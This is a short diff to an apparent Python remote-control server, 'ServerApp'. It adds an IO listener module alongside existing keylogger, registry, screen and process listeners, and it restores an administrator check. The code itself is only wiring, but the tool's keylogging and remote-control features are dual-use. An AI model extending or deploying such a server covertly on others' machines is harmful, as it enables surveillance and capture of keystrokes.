@@ -1,6 +1,7 @@
 from ServerSocket import ServerSocket
 from KeyLogger import KeyLogger
 from Window import OS
+from IO import IO
 from Registry import Registry
 from Screen import Screen
 from Process import Process
@@ -23,7 +24,7 @@ ADDR = (HOST, PORT)
 
 class ServerApp:
     def __init__(self):
-        if True:  # self.is_admin():
+        if self.is_admin():
             self.setup()
 
         else:
@@ -63,6 +64,7 @@ class ServerApp:
         self.application = Application(self.server)
         self.network = Network(self.server)
         self.share_file = ShareFile(self.server)
+        self.io = IO(self.server)
 
         self.start_listening(sysTrayIcon)
 
@@ -76,6 +78,7 @@ class ServerApp:
 
             listeners = [
                 self.share_file.start_listening,  # DONE
+                self.io.start_listening,  # DONE
                 self.key_logger.start_listening,  # DONE
                 self.os.start_listening,  # DONE
                 self.registry.start_listening,  # DONE
